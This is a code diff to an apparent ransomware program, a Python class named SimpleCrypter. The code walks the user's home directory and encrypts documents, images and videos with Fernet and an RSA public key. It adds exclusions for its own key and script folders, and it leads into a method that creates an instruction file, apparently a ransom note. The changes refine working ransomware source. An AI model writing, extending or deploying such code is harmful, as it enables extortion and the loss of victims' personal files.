@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization, hashes
 import os
-import platform
+from utils import iterator, get_script_directory, get_home_directory
 
 
 class SimpleCrypter:
@@ -11,15 +11,7 @@ class SimpleCrypter:
         self.crypter = None
         self.public_key = None
         self.file_exts = ['txt', 'doc', 'pdf', 'jpg', 'png', 'mp4', 'mov', 'docx']
-
-    def get_system_root(self):
-        system = platform.system()
-        if system == "Windows":
-            return os.path.join(os.path.expanduser('~'), '..')  # Parent of user directory
-        elif system in ["Linux", "Darwin"]:  # Linux ou macOS
-            return '/home'
-        else:
-            raise OSError("Operating system not supported")
+        self.exclude_dirs = [os.path.abspath('keys'), get_script_directory()]
 
     def generate_key(self):
         self.key = Fernet.generate_key()
@@ -61,18 +53,29 @@ class SimpleCrypter:
         except Exception as e:
             print(f"Error processing {file_path}: {e}")
 
+    def should_encrypt(self, file_path):
+        for dir in self.exclude_dirs:
+            if file_path.startswith(dir):
+                return False
+
+        file_name = os.path.basename(file_path)
+        if file_name.startswith('.') or file_name.startswith('~'):
+            return False
+
+        return file_path.split('.')[-1] in self.file_exts
+
     def crypt_system(self, encrypt=True):
-        system_root = self.get_system_root()
-        for root, _, files in os.walk(system_root):
-            for file in files:
-                if file.split('.')[-1] in self.file_exts:
-                    file_path = os.path.join(root, file)
-                    if encrypt:
-                        if not file.endswith('.encrypted'):
-                            self.crypt_file(file_path, encrypt=True)
-                    else:
-                        if file.endswith('.encrypted'):
-                            self.crypt_file(file_path, encrypt=False)
+        system_root = get_home_directory()
+
+        files_to_encrypt = iterator(system_root, exclude_dirs=self.exclude_dirs, allowed_extensions=self.file_exts)
+
+        for file_path in files_to_encrypt:
+            if encrypt:
+                if not file_path.endswith('.encrypted'):
+                    self.crypt_file(file_path, encrypt=True)
+            else:
+                if file_path.endswith('.encrypted'):
+                    self.crypt_file(file_path, encrypt=False)
 
     def create_instruction_file(self):
         instruction = """
